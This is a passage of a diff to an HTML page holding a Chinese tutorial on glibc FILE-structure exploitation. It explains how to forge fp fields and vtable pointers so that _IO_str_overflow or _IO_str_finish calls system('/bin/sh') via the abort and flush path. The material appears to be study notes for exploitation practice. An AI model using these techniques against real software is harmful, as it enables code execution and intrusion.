+  if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))  // 条件 #define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)
+  {
+      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */
+            return EOF;
+      else
+      {
+            char *new_buf;
+            char *old_buf = fp-&gt;_IO_buf_base;
+            size_t old_blen = _IO_blen (fp);
+            _IO_size_t new_size = 2 * old_blen + 100;      // 通过计算 new_size 为 &quot;/bin/sh\x00&quot; 的地址
+            if (new_size &lt; old_blen)
+                return EOF;
+            new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);     // 在这个相对地址放上 system 的地址，即 system(&quot;/bin/sh&quot;)
+    [...]
+</code></pre>
+
+<p>因此我们可以下面的方式对fp指针进行构造：
+所以可以像下面这样构造：</p>
+<pre><code>fp-&gt;_flags = 0
+fp-&gt;_IO_buf_base = 0
+fp-&gt;_IO_buf_end = (bin_sh_addr - 100) / 2
+fp-&gt;_IO_write_ptr = 0xffffffff
+fp-&gt;_IO_write_base = 0
+fp-&gt;_mode = 0
+</code></pre>
+
+<p>此时，根据代码所示可以推导出如下等式：<br />
+old_blen = _IO_blen(fp) = fp-&gt;_IO_buf_end - _IO_buf_base = _IO_buf_end<br />
+new_size = 2 * old_blen +100 = 2*_IO_buf_end + 100 = (bin_sh_addr - 100）/ 2 * 2 + 100 = bin_sh_addr<br />
+这样我们就布置好了system函数需要调用的参数，接下来就是如何控制程序执行流程了。</p>
+<p>我们注意到在_IO_str_overflow函数中有这样一行代码</p>
+<pre><code>new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); 
+</code></pre>
+
+<p>可以看到在该函数中有一个虚表调用，调用的函数地址为相对fp偏移0xe0（64bit）的_allocate_buffer函数，如果我们把该地址的内容替换为system函数，不就可以劫持程序控制流了吗？确实如此！我们只要在fp+0xe0的位置放置system函数的指针即可劫持控制流。<br />
+<strong>有一点要注意的是，如果 bin_sh_addr 的地址以奇数结尾，为了避免除法向下取整的干扰，可以将该地址加 1。另外 system(&quot;/bin/sh&quot;) 是可以用 one_gadget 来代替的，这样似乎更加简单。</strong></p>
+<p>利用_IO_str_overflow的完成调用过程（还有其他的利用路径，本文只列出了针对malloc_printerr的情况）：</p>
+<pre><code>malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; __GI__IO_str_overflow
+</code></pre>
+
+<h4>5.3.1.2 _IO_str_finish利用方法</h4>
+<p>在vtable中还有另一个函数可以利用，就是_IO_str_finish，该函数的利用方式较为简单，下面我们先看看该函数的代码。</p>
+<pre><code>void _IO_str_finish (_IO_FILE *fp, int dummy)
+{
+  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))             // 条件
+    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);     // 在这个相对地址放上 system 的地址
+  fp-&gt;_IO_buf_base = NULL;
+
+  _IO_default_finish (fp, 0);
 }
-libc_hidden_def (_IO_str_overflow)
-</pre>
+</code></pre>
+
+<p>我们只要让 fp-&gt;_IO_buf_base 等于&quot;/bin/sh&quot; 的地址，然后设置 fp-&gt;_flags = 0 就可以了绕过函数里的条件。</p>
+<p>接下来的关键就是如何控制程序执行流程到_IO_str_finish。一个显而易见的方法为调用fclose函数，但这用方法有局限性，不是每个程序都会调用fclose。那么还有没有一条其他的路径呢？答案是有！，我们还是利用异常处理。</p>
+<p>通过前面对_IO_flush_all_lockp 函数的分析，我们知道该函数最终会调用 _IO_OVERFLOW执行 __GI__IO_str_overflow，而 _IO_OVERFLOW 是根据 __overflow 相对于 _IO_str_jumps vtable 的偏移（64bit，offset = 0x18）找到具体函数的。所以如果我们伪造传递给 _IO_OVERFLOW(fp) 的 fp-&gt;vtable 为 _IO_str_jumps 减去 0x8，那么根据偏移（+0x18），程序将找到 _IO_str_finish (_IO_str_jumps - 0x8 + 0x18 = _IO_str_jumps + 0x10）并执行。</p>
+<p>所以可以像下面这样构造：</p>
+<pre><code>fp-&gt;_mode = 0
+fp-&gt;_IO_write_ptr = 0xffffffff
+fp-&gt;_IO_write_base = 0
+fp-&gt;_IO_buf_base = bin_sh_addr
+</code></pre>
+
+<p>完整的调用过程：</p>
+<pre><code>malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; __GI__IO_str_finish
+</code></pre>
+
+<h3>5.3.2 利用_IO_wstr_jumps</h3>
+<p>_IO_wstr_jumps 也是一个符合条件的 vtable，总体上和上面讲的 _IO_str_jumps 差不多。</p>
+<p>_IO_wstr_jumps虚表结构如下所示：</p>
+<pre><code>// libio/wstrops.c
+
+const struct _IO_jump_t _IO_wstr_jumps libio_vtable =
+{
+  JUMP_INIT_DUMMY,
+  JUMP_INIT(finish, _IO_wstr_finish),
+  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstr_overflow),
+  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),
+  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
+  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),
+  JUMP_INIT(xsputn, _IO_wdefault_xsputn),
+  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),
+  JUMP_INIT(seekoff, _IO_wstr_seekoff),
+  JUMP_INIT(seekpos, _IO_default_seekpos),
+  JUMP_INIT(setbuf, _IO_default_setbuf),
+  JUMP_INIT(sync, _IO_default_sync),
+  JUMP_INIT(doallocate, _IO_wdefault_doallocate),
+  JUMP_INIT(read, _IO_default_read),
+  JUMP_INIT(write, _IO_default_write),
+  JUMP_INIT(seek, _IO_default_seek),
+  JUMP_INIT(close, _IO_default_close),
+  JUMP_INIT(stat, _IO_default_stat),
+  JUMP_INIT(showmanyc, _IO_default_showmanyc),
+  JUMP_INIT(imbue, _IO_default_imbue)
+};
+
+_IO_wint_t _IO_wstr_overflow (_IO_FILE *fp, _IO_wint_t c)
+{
+  int flush_only = c == WEOF;
+  _IO_size_t pos;
+  if (fp-&gt;_flags &amp; _IO_NO_WRITES)
+      return flush_only ? 0 : WEOF;
+  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
+  {
+      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;
+      fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_read_ptr;
+      fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;
+  }
+  pos = fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base;
+  if (pos &gt;= (_IO_size_t) (_IO_wblen (fp) + flush_only))    // 条件 #define _IO_wblen(fp) ((fp)-&gt;_wide_data-&gt;_IO_buf_end - (fp)-&gt;_wide_data-&gt;_IO_buf_base)
+  {
+      if (fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF) /* not allowed to enlarge */
+            return WEOF;
+      else
+      {
+            wchar_t *new_buf;
+            wchar_t *old_buf = fp-&gt;_wide_data-&gt;_IO_buf_base;
+            size_t old_wblen = _IO_wblen (fp);
+            _IO_size_t new_size = 2 * old_wblen + 100;              // 使 new_size * sizeof(wchar_t) 为 &quot;/bin/sh&quot; 的地址
+
+            if (__glibc_unlikely (new_size &lt; old_wblen)
+                || __glibc_unlikely (new_size &gt; SIZE_MAX / sizeof (wchar_t)))
+                return EOF;
+
+            new_buf = (wchar_t *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size * sizeof (wchar_t));    // 在这个相对地址放上 system 的地址
+    [...]
+</code></pre>
+
+<p>其他的都没有发生变化，唯一需要注意的就是其中条件判断的字段都变为了fp-&gt;_wide_data字段。  </p>
+<p>利用函数 _IO_wstr_finish：</p>
+<pre><code>void _IO_wstr_finish (_IO_FILE *fp, int dummy)
+{
+  if (fp-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))    // 条件
+    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_wide_data-&gt;_IO_buf_base);     // 在这个相对地址放上 system 的地址
+  fp-&gt;_wide_data-&gt;_IO_buf_base = NULL;
+
+  _IO_wdefault_finish (fp, 0);
+}
+</code></pre>
+
+
 </body>
 </html>
 <!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
